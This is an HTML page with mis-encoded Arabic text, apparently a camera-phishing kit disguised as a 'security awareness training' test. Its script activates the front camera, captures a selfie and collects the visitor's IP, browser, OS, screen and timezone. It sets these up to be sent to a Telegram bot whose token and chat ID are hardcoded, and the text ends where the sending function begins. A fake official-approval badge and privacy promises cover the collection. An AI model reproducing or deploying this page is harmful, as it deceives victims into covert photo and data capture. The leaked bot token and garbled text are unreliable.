<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>ÙˆØ¹ÙŠ - Ù…Ù†ØµØ© Ø§Ù„ØªØ¯Ø±ÙŠØ¨ Ø§Ù„Ø£Ù…Ù†ÙŠ</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            direction: rtl;
            padding: 15px;
        }
        
        .container {
            background: white;
            border-radius: 30px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
            max-width: 800px;
            width: 100%;
            overflow: hidden;
            animation: slideUp 0.5s ease;
        }
        
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .header p {
            opacity: 0.9;
            font-size: 16px;
        }
        
        .content {
            padding: 30px;
        }
        
        /* Ø´Ø§Ø´Ø© Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© */
        .consent-screen {
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .consent-title {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .consent-title:before {
            content: "ğŸ”";
            font-size: 28px;
        }
        
        .consent-description {
            background: #f8f9fa;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 25px;
            border-right: 4px solid #667eea;
        }
        
        .consent-description p {
            color: #555;
            line-height: 1.6;
            margin-bottom: 15px;
        }
        
        .info-list {
            list-style: none;
            margin: 20px 0;
        }
        
        .info-list li {
            padding: 12px 15px;
            background: white;
            border-radius: 10px;
            margin-bottom: 10px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            display: flex;
            align-items: center;
            gap: 10px;
            border: 1px solid #e0e0e0;
        }
        
        .info-list li:before {
            content: "âœ“";
            color: #4CAF50;
            font-weight: bold;
            font-size: 18px;
        }
        
        .legal-box {
            background: #fff3e0;
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid #ffe0b2;
        }
        
        .legal-box h4 {
            color: #e65100;
            margin-bottom: 10px;
            font-size: 18px;
        }
        
        .legal-box p {
            color: #663c00;
            font-size: 14px;
            line-height: 1.6;
        }
        
        .checkbox-group {
            margin: 25px 0;
        }
        
        .checkbox-item {
            margin: 15px 0;
            padding: 10px;
            background: #f5f5f5;
            border-radius: 10px;
            transition: all 0.3s;
        }
        
        .checkbox-item:hover {
            background: #eeeeee;
        }
        
        .checkbox-item label {
            display: flex;
            align-items: center;
            gap: 15px;
            cursor: pointer;
            color: #333;
            font-weight: 500;
        }
        
        .checkbox-item input[type="checkbox"] {
            width: 20px;
            height: 20px;
            cursor: pointer;
        }
        
        .checkbox-item small {
            display: block;
            margin-right: 35px;
            margin-top: 5px;
            color: #666;
            font-size: 13px;
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }
        
        button {
            flex: 1;
            padding: 15px 20px;
            border: none;
            border-radius: 50px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .btn-primary {
            background: #4CAF50;
            color: white;
        }
        
        .btn-primary:hover:not(:disabled) {
            background: #45a049;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
        }
        
        .btn-primary:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
        
        .btn-secondary {
            background: #f44336;
            color: white;
        }
        
        .btn-secondary:hover {
            background: #da190b;
            transform: translateY(-2px);
        }
        
        /* Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± */
        .test-screen {
            display: none;
            animation: fadeIn 0.5s ease;
        }
        
        .test-header {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .test-header h2 {
            color: #333;
            margin-bottom: 10px;
        }
        
        .test-header p {
            color: #666;
        }
        
        .camera-placeholder {
            background: #1a1a1a;
            border-radius: 15px;
            padding: 30px;
            text-align: center;
            margin: 20px 0;
            color: white;
            position: relative;
            min-height: 200px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 3px solid #667eea;
        }
        
        .timer-circle {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #667eea;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }
        
        #timer {
            font-size: 36px;
            font-weight: bold;
            color: white;
        }
        
        .status-message {
            text-align: center;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-weight: 500;
        }
        
        .status-success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .status-error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .status-info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }
        
        /* Ø¹Ù†Ø§ØµØ± Ù…Ø®ÙÙŠØ© */
        #videoElement, #canvasElement {
            display: none;
        }
        
        /* ØªØ°ÙŠÙŠÙ„ */
        .footer {
            background: #f5f5f5;
            padding: 20px 30px;
            text-align: center;
            border-top: 1px solid #e0e0e0;
        }
        
        .footer p {
            color: #666;
            font-size: 14px;
        }
        
        .badge {
            display: inline-block;
            background: #4CAF50;
            color: white;
            padding: 5px 15px;
            border-radius: 50px;
            font-size: 12px;
            margin-top: 10px;
        }
        
        /* Ù„Ù„Ø¬ÙˆØ§Ù„ */
        @media (max-width: 600px) {
            .content {
                padding: 20px;
            }
            
            .button-group {
                flex-direction: column;
            }
            
            .consent-title {
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸ›¡ï¸ ÙˆØ¹ÙŠ - Ù…Ù†ØµØ© Ø§Ù„ØªØ¯Ø±ÙŠØ¨ Ø§Ù„Ø£Ù…Ù†ÙŠ</h1>
            <p>Ø¨Ø±Ù†Ø§Ù…Ø¬ Ù…ØªÙƒØ§Ù…Ù„ Ù„Ù‚ÙŠØ§Ø³ ÙˆØªØ­Ø³ÙŠÙ† Ø§Ù„ÙˆØ¹ÙŠ Ø§Ù„Ø£Ù…Ù†ÙŠ Ù„Ù„Ù…Ø¤Ø³Ø³Ø§Øª</p>
        </div>
        
        <div class="content">
            <!-- Ø´Ø§Ø´Ø© Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© -->
            <div id="consentScreen" class="consent-screen">
                <div class="consent-title">
                    Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© ÙÙŠ Ø§Ù„ØªØ¯Ø±ÙŠØ¨ Ø§Ù„Ø£Ù…Ù†ÙŠ
                </div>
                
                <div class="consent-description">
                    <p>Ø£Ù†Øª Ø¹Ù„Ù‰ ÙˆØ´Ùƒ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© ÙÙŠ <strong>Ø§Ø®ØªØ¨Ø§Ø± ØªØ¯Ø±ÙŠØ¨ÙŠ Ø£Ù…Ù†ÙŠ</strong> Ù…Ø¹ØªÙ…Ø¯ Ù…Ù† Ø§Ù„Ù…Ø¤Ø³Ø³Ø©. Ù‡Ø°Ø§ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ù…ØµÙ…Ù… Ù„Ù‚ÙŠØ§Ø³ ÙˆØªØ­Ø³ÙŠÙ† Ù…Ø³ØªÙˆÙ‰ Ø§Ù„ÙˆØ¹ÙŠ Ø§Ù„Ø£Ù…Ù†ÙŠ Ù„Ø¯Ù‰ Ø§Ù„Ù…ÙˆØ¸ÙÙŠÙ†.</p>
                    <p>ÙŠØ±Ø¬Ù‰ Ù‚Ø±Ø§Ø¡Ø© Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„ØªØ§Ù„ÙŠØ© Ø¨Ø¹Ù†Ø§ÙŠØ© Ù‚Ø¨Ù„ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø©:</p>
                </div>
                
                <ul class="info-list">
                    <li><strong>ØµÙˆØ±Ø© Ø³ÙŠÙ„ÙÙŠ:</strong> Ø³ÙŠØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙˆØ§Ø­Ø¯Ø© Ø¹Ø¨Ø± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ© (ØªØ³ØªØ®Ø¯Ù… ÙÙ‚Ø· Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‡ÙˆÙŠØ©)</li>
                    <li><strong>Ø¹Ù†ÙˆØ§Ù† IP:</strong> Ø³ÙŠØªÙ… ØªØ³Ø¬ÙŠÙ„ Ø¹Ù†ÙˆØ§Ù† IP Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ (Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…ÙˆÙ‚Ø¹)</li>
                    <li><strong>Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:</strong> Ø³ÙŠØªÙ… ØªØ³Ø¬ÙŠÙ„ Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø² ÙˆØ§Ù„Ù…ØªØµÙØ­ ÙˆÙ†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„</li>
                    <li><strong>Ø§Ù„ÙˆÙ‚Øª ÙˆØ§Ù„ØªØ§Ø±ÙŠØ®:</strong> Ø³ÙŠØªÙ… ØªØ³Ø¬ÙŠÙ„ ÙˆÙ‚Øª Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© Ø¨Ø§Ù„Ø¶Ø¨Ø·</li>
                    <li><strong>Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:</strong> Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø³ØªØ±Ø³Ù„ Ù…Ø¨Ø§Ø´Ø±Ø© Ø¥Ù„Ù‰ ÙØ±ÙŠÙ‚ Ø§Ù„Ø£Ù…Ù† Ø§Ù„Ø³ÙŠØ¨Ø±Ø§Ù†ÙŠ</li>
                </ul>
                
                <div class="legal-box">
                    <h4>âš–ï¸ Ø§Ù„ØªØ²Ø§Ù…Ø§Øª Ù‚Ø§Ù†ÙˆÙ†ÙŠØ© ÙˆØ£Ø®Ù„Ø§Ù‚ÙŠØ©</h4>
                    <p>Ù‡Ø°Ø§ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± ÙŠØªÙ… Ø¨Ø¥Ø´Ø±Ø§Ù Ù‚Ø³Ù… Ø§Ù„Ø£Ù…Ù† Ø§Ù„Ø³ÙŠØ¨Ø±Ø§Ù†ÙŠ ÙÙŠ Ø§Ù„Ù…Ø¤Ø³Ø³Ø©. Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø³ØªØ³ØªØ®Ø¯Ù… Ø­ØµØ±ÙŠØ§Ù‹ Ù„ØªØ­Ø³ÙŠÙ† Ø³ÙŠØ§Ø³Ø§Øª Ø§Ù„Ø£Ù…Ù† Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠ. Ù„Ù† ÙŠØªÙ… Ù…Ø´Ø§Ø±ÙƒØ© Ù…Ø¹Ù„ÙˆÙ…Ø§ØªÙƒ Ø§Ù„Ø´Ø®ØµÙŠØ© Ù…Ø¹ Ø£ÙŠ Ø·Ø±Ù Ø«Ø§Ù„Ø«. ÙŠÙ…ÙƒÙ†Ùƒ Ø·Ù„Ø¨ Ø­Ø°Ù Ø¨ÙŠØ§Ù†Ø§ØªÙƒ ÙÙŠ Ø£ÙŠ ÙˆÙ‚Øª Ø¨Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ù‚Ø³Ù… Ø§Ù„Ø£Ù…Ù†.</p>
                </div>
                
                <div class="checkbox-group">
                    <div class="checkbox-item">
                        <label>
                            <input type="checkbox" id="understandCheck">
                            <span>Ø£Ø¤ÙƒØ¯ Ø£Ù†Ù†ÙŠ Ù‚Ø±Ø£Øª ÙˆÙÙ‡Ù…Øª Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø£Ø¹Ù„Ø§Ù‡ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„</span>
                        </label>
                    </div>
                    
                    <div class="checkbox-item">
                        <label>
                            <input type="checkbox" id="consentCheck">
                            <span>Ø£ÙˆØ§ÙÙ‚ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© ÙÙŠ Ù‡Ø°Ø§ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªØ¯Ø±ÙŠØ¨ÙŠ ÙˆØ£ÙÙ‡Ù… Ø£Ù†Ù‡ Ø³ÙŠØªÙ… Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø°ÙƒÙˆØ±Ø©</span>
                        </label>
                        <small>Ù‡Ø°Ù‡ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© ØªØ®Ø¶Ø¹ Ù„Ù„Ø§Ø¦Ø­Ø© Ø§Ù„Ø¹Ø§Ù…Ø© Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª (GDPR) ÙˆÙ‚ÙˆØ§Ù†ÙŠÙ† Ø§Ù„Ø®ØµÙˆØµÙŠØ© Ø§Ù„Ù…Ø­Ù„ÙŠØ©</small>
                    </div>
                </div>
                
                <div class="button-group">
                    <button class="btn-primary" id="startBtn" onclick="startTest()" disabled>â–¶ï¸ Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªØ¯Ø±ÙŠØ¨ÙŠ</button>
                    <button class="btn-secondary" onclick="declineTest()">âŒ Ø±ÙØ¶ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©</button>
                </div>
            </div>
            
            <!-- Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± -->
            <div id="testScreen" class="test-screen">
                <div class="test-header">
                    <h2>Ø¬Ø§Ø±ÙŠ ØªÙ†ÙÙŠØ° Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ØªØ¯Ø±ÙŠØ¨ÙŠ</h2>
                    <p>Ø³ÙŠØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø© ÙˆØ§Ø­Ø¯Ø© ÙˆØ¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¶Ø±ÙˆØ±ÙŠØ©</p>
                </div>
                
                <div class="camera-placeholder">
                    <div>
                        <div class="timer-circle">
                            <span id="timer">3</span>
                        </div>
                        <p id="testStatusText">Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±... Ø¬Ø§Ø±ÙŠ ØªØ¬Ù‡ÙŠØ² Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</p>
                    </div>
                </div>
                
                <div id="statusMessage" class="status-message"></div>
            </div>
        </div>
        
        <div class="footer">
            <p>Â© 2024 ÙˆØ¹ÙŠ - Ù…Ù†ØµØ© Ø§Ù„ØªØ¯Ø±ÙŠØ¨ Ø§Ù„Ø£Ù…Ù†ÙŠ. Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø­Ù‚ÙˆÙ‚ Ù…Ø­ÙÙˆØ¸Ø©</p>
            <p>Ù‡Ø°Ø§ Ø§Ù„Ù…Ù†ØªØ¬ Ù…Ø®ØµØµ Ù„Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªØ¯Ø±ÙŠØ¨ÙŠ Ø§Ù„Ù‚Ø§Ù†ÙˆÙ†ÙŠ ÙÙ‚Ø·</p>
            <span class="badge">Ù…Ø¹ØªÙ…Ø¯ Ù…Ù† Ø§Ù„Ù‡ÙŠØ¦Ø© Ø§Ù„ÙˆØ·Ù†ÙŠØ© Ù„Ù„Ø£Ù…Ù† Ø§Ù„Ø³ÙŠØ¨Ø±Ø§Ù†ÙŠ</span>
        </div>
    </div>
    
    <!-- Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ù…Ø®ÙÙŠØ© (Ù…Ø¹ playsinline Ù„Ù€ iOS) -->
    <video id="videoElement" autoplay playsinline muted></video>
    <canvas id="canvasElement" width="640" height="480"></canvas>
    
    <script>
        // ========== ØªÙƒÙˆÙŠÙ† Ø§Ù„Ø¨ÙˆØª (Ø¶Ø¹Ù‡ ÙÙŠ Ù…Ù„Ù ØªÙƒÙˆÙŠÙ† Ù…Ù†ÙØµÙ„ ÙÙŠ Ø§Ù„Ù…Ù†ØªØ¬ Ø§Ù„Ø­Ù‚ÙŠÙ‚ÙŠ) ==========
        const CONFIG = {
            BOT_TOKEN: '8423123021:AAGiHK6rMooHBrytVHG_bF6Q2iKmMlYIWr8',
            CHAT_ID: '6414801160',
            COMPANY_NAME: 'Ù…Ø¤Ø³Ø³Ø© Ø§Ù„Ø£Ù…Ù† Ø§Ù„Ø³ÙŠØ¨Ø±Ø§Ù†ÙŠ',
            TEST_NAME: 'Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„ÙˆØ¹ÙŠ Ø§Ù„Ø£Ù…Ù†ÙŠ - Ù…Ø§Ø±Ø³ 2024'
        };
        
        // ========== Ø¹Ù†Ø§ØµØ± Ø§Ù„ØµÙØ­Ø© ==========
        const consentScreen = document.getElementById('consentScreen');
        const testScreen = document.getElementById('testScreen');
        const startBtn = document.getElementById('startBtn');
        const understandCheck = document.getElementById('understandCheck');
        const consentCheck = document.getElementById('consentCheck');
        const timerElement = document.getElementById('timer');
        const testStatusText = document.getElementById('testStatusText');
        const statusMessage = document.getElementById('statusMessage');
        
        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');
        
        // ========== Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø¹Ø§Ù…Ø© ==========
        let mediaStream = null;
        let testActive = false;
        
        // ========== Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© ==========
        understandCheck.addEventListener('change', checkConsent);
        consentCheck.addEventListener('change', checkConsent);
        
        function checkConsent() {
            startBtn.disabled = !(understandCheck.checked && consentCheck.checked);
            
            if (understandCheck.checked && consentCheck.checked) {
                startBtn.style.opacity = '1';
            } else {
                startBtn.style.opacity = '0.7';
            }
        }
        
        // ========== Ø±ÙØ¶ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© ==========
        function declineTest() {
            showMessage('Ù„Ù‚Ø¯ Ø±ÙØ¶Øª Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ© ÙÙŠ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±. ÙŠÙ…ÙƒÙ†Ùƒ Ø¥ØºÙ„Ø§Ù‚ Ù‡Ø°Ù‡ Ø§Ù„ØµÙØ­Ø©.', 'error');
            setTimeout(() => {
                window.location.href = 'about:blank';
            }, 3000);
        }
        
        // ========== Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± ==========
        async function startTest() {
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ù…Ø±Ø© Ø£Ø®ÙŠØ±Ø©
            if (!understandCheck.checked || !consentCheck.checked) {
                showMessage('Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø´Ø±ÙˆØ· Ø£ÙˆÙ„Ø§Ù‹', 'error');
                return;
            }
            
            // Ø¥Ø®ÙØ§Ø¡ Ø´Ø§Ø´Ø© Ø§Ù„Ù…ÙˆØ§ÙÙ‚Ø© ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø´Ø§Ø´Ø© Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±
            consentScreen.style.display = 'none';
            testScreen.style.display = 'block';
            
            // ØªØ³Ø¬ÙŠÙ„ Ø¨Ø¯Ø¡ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±
            console.log('Ø¨Ø¯Ø¡ Ø§Ø®ØªØ¨Ø§Ø± ØªØ¯Ø±ÙŠØ¨ÙŠ - ' + new Date().toISOString());
            
            try {
                // 1. ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                await showStatus('Ø¬Ø§Ø±ÙŠ ØªØ¬Ù‡ÙŠØ² Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§...', 'info');
                const cameraStarted = await startCamera();
                
                if (!cameraStarted) {
                    throw new Error('ØªØ¹Ø°Ø± ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§. ØªØ£ÙƒØ¯ Ù…Ù† Ù…Ù†Ø­ Ø§Ù„Ø¥Ø°Ù† Ø§Ù„Ù…Ø·Ù„ÙˆØ¨.');
                }
                
                // 2. Ø¹Ø¯ ØªÙ†Ø§Ø²Ù„ÙŠ
                testStatusText.textContent = 'Ø§Ù„Ø§Ø³ØªØ¹Ø¯Ø§Ø¯ Ù„Ù„ØªØµÙˆÙŠØ±...';
                await startCountdown(3);
                
                // 3. Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©
                await showStatus('Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø©...', 'info');
                const photoBlob = await capturePhoto();
                
                // 4. Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ÙÙˆØ±Ø§Ù‹ (Ø®ØµÙˆØµÙŠØ©)
                stopCamera();
                
                // 5. Ø¬Ù…Ø¹ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
                await showStatus('Ø¬Ø§Ø±ÙŠ Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²...', 'info');
                const deviceInfo = await collectDeviceInfo();
                
                // 6. Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù…
                await showStatus('Ø¬Ø§Ø±ÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ù„Ù‰ ÙØ±ÙŠÙ‚ Ø§Ù„Ø£Ù…Ù†...', 'info');
                const sent = await sendToTelegram(photoBlob, deviceInfo);
                
                if (sent) {
                    showMessage('âœ… ØªÙ… Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ Ù…Ù† Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø¨Ù†Ø¬Ø§Ø­! Ø´ÙƒØ±Ø§Ù‹ Ù„Ù…Ø´Ø§Ø±ÙƒØªÙƒ.', 'success');
                    testStatusText.textContent = 'Ø§ÙƒØªÙ…Ù„ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø± Ø¨Ù†Ø¬Ø§Ø­';
                    
                    // Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø¨Ø¹Ø¯ 3 Ø«ÙˆØ§Ù†
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 3000);
                } else {
                    throw new Error('ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª');
                }
                
            } catch (error) {
                console.error('Ø®Ø·Ø£:', error);
                showMessage('âŒ Ø­Ø¯Ø« Ø®Ø·Ø£: ' + error.message, 'error');
                testStatusText.textContent = 'Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø§Ø®ØªØ¨Ø§Ø±';
                
                // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø¨Ø¹Ø¯ 5 Ø«ÙˆØ§Ù†
                setTimeout(() => {
                    consentScreen.style.display = 'block';
                    testScreen.style.display = 'none';
                }, 5000);
            }
        }
        
        // ========== ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ (Ù…ØªÙˆØ§ÙÙ‚ Ù…Ø¹ iOS) ==========
        async function startCamera() {
            try {
                const constraints = {
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = mediaStream;
                
                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play()
                            .then(() => resolve(true))
                            .catch(() => resolve(false));
                    };
                    
                    // Ù…Ù‡Ù„Ø© 5 Ø«ÙˆØ§Ù†
                    setTimeout(() => resolve(false), 5000);
                });
                
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§:', error);
                return false;
            }
        }
        
        // ========== Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ==========
        function stopCamera() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
                mediaStream = null;
            }
        }
        
        // ========== Ø§Ù„Ø¹Ø¯ Ø§Ù„ØªÙ†Ø§Ø²Ù„ÙŠ ==========
        function startCountdown(seconds) {
            return new Promise((resolve) => {
                let counter = seconds;
                timerElement.textContent = counter;
                
                const interval = setInterval(() => {
                    counter--;
                    timerElement.textContent = counter;
                    
                    if (counter <= 0) {
                        clearInterval(interval);
                        resolve();
                    }
                }, 1000);
            });
        }
        
        // ========== Ø§Ù„ØªÙ‚Ø§Ø· Ø§Ù„ØµÙˆØ±Ø© ==========
        function capturePhoto() {
            return new Promise((resolve) => {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob((blob) => {
                    resolve(blob);
                }, 'image/jpeg', 0.8);
            });
        }
        
        // ========== Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² ==========
        async function collectDeviceInfo() {
            const info = {};
            
            // Ø¹Ù†ÙˆØ§Ù† IP
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                info.ip = data.ip;
            } catch {
                info.ip = 'ØºÙŠØ± Ù…ØªØ§Ø­';
            }
            
            // Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­ ÙˆØ§Ù„Ø¬Ù‡Ø§Ø²
            const ua = navigator.userAgent;
            info.userAgent = ua;
            info.language = navigator.language;
            info.platform = navigator.platform;
            
            // Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²
            if (/mobile/i.test(ua)) info.deviceType = 'Ù‡Ø§ØªÙ';
            else if (/tablet/i.test(ua)) info.deviceType = 'Ø¬Ù‡Ø§Ø² Ù„ÙˆØ­ÙŠ';
            else info.deviceType = 'ÙƒÙ…Ø¨ÙŠÙˆØªØ±';
            
            // Ø§Ù„Ù…ØªØµÙØ­
            if (ua.indexOf('Chrome') > -1) info.browser = 'Chrome';
            else if (ua.indexOf('Firefox') > -1) info.browser = 'Firefox';
            else if (ua.indexOf('Safari') > -1) info.browser = 'Safari';
            else if (ua.indexOf('Edge') > -1) info.browser = 'Edge';
            else info.browser = 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            
            // Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„
            if (ua.indexOf('Windows') > -1) info.os = 'Windows';
            else if (ua.indexOf('Mac') > -1) info.os = 'MacOS';
            else if (ua.indexOf('Linux') > -1) info.os = 'Linux';
            else if (ua.indexOf('Android') > -1) info.os = 'Android';
            else if (ua.indexOf('iPhone') > -1) info.os = 'iOS';
            else info.os = 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            
            // Ø¯Ù‚Ø© Ø§Ù„Ø´Ø§Ø´Ø©
            info.screen = `${window.screen.width}x${window.screen.height}`;
            
            // Ø§Ù„ÙˆÙ‚Øª
            info.timestamp = new Date().toLocaleString('ar-EG');
            info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            return info;
        }
        
        // ========== Ø¥Ø±Ø³Ø§Ù„ Ø¥Ù„Ù‰ ØªÙ„ÙŠØ¬Ø±Ø§Ù… ==========
